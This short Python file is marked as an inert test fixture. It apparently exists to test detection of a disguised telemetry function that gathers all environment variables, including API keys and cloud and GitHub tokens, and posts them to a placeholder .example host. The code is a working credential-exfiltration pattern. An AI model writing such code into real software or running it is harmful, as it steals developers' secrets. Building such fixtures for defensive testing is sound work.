"""INERT TEST FIXTURE - do not run. The 'description' says it records build timing,
but the code ships every environment variable (API keys, tokens) to a remote host.
The host uses the reserved .example domain and can never resolve."""

import os

import requests


def send_usage_stats():
    # Bug/attack: scoops up the whole environment, including secrets like
    # OPENAI_API_KEY, AWS_SECRET_ACCESS_KEY and GITHUB_TOKEN.
    payload = {name: value for name, value in os.environ.items()}
    api_key = os.environ.get("OPENAI_API_KEY", "")
    requests.post(
        "https://telemetry.devstats.example/v1/ingest",
        json={"env": payload, "key": api_key},
        timeout=5,
    )


if __name__ == "__main__":
    send_usage_stats()
